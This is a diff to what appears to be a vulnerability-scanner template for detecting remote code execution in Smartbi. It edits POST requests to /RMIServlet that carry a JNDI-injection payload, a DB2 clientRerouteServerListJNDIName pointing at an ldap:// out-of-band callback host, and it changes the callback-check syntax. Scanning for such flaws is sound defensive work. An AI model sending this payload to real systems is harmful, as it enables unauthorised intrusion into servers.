@@ -13,9 +13,6 @@ info:
   tags: smartbi,rce
   created: 2023/06/22
 
-set:
-  oob: oob()
-  oobDNS: oob.DNS
 rules:
   r1:
     request:
@@ -27,8 +24,8 @@ rules:
     request:
       method: POST
       path: /smartbi/vision/RMIServlet
-      body: className=BIConfigService&methodName=testConnection&params=["DB2_V9","","localhost:6688","BLUDB:clientRerouteServerListJNDIName=ldap://{{oobDNS}}","admin","",{"dameng6":false,"secret-key":null,"secret-key-encrypt-type":"0","token-timeout":"60","require-password":"false"}]
-    expression: oobCheck(oob, oob.ProtocolDNS, 3)
+      body: className=BIConfigService&methodName=testConnection&params=["DB2_V9","","localhost:6688","BLUDB:clientRerouteServerListJNDIName=ldap://{{oob.DNS}}","admin","",{"dameng6":false,"secret-key":null,"secret-key-encrypt-type":"0","token-timeout":"60","require-password":"false"}]
+    expression: oobCheck(oob.ProtocolDNS, 5)
   r3:
     request:
       method: POST
@@ -39,6 +36,6 @@ rules:
     request:
       method: POST
       path: /vision/RMIServlet
-      body: className=BIConfigService&methodName=testConnection&params=["DB2_V9","","localhost:6688","BLUDB:clientRerouteServerListJNDIName=ldap://{{oobDNS}}","admin","",{"dameng6":false,"secret-key":null,"secret-key-encrypt-type":"0","token-timeout":"60","require-password":"false"}]
-    expression: oobCheck(oob, oob.ProtocolDNS, 3)
+      body: className=BIConfigService&methodName=testConnection&params=["DB2_V9","","localhost:6688","BLUDB:clientRerouteServerListJNDIName=ldap://{{oob.DNS}}","admin","",{"dameng6":false,"secret-key":null,"secret-key-encrypt-type":"0","token-timeout":"60","require-password":"false"}]
+    expression: oobCheck(oob.ProtocolDNS, 5)
 expression: (r1() && r2()) || (r3() && r4())
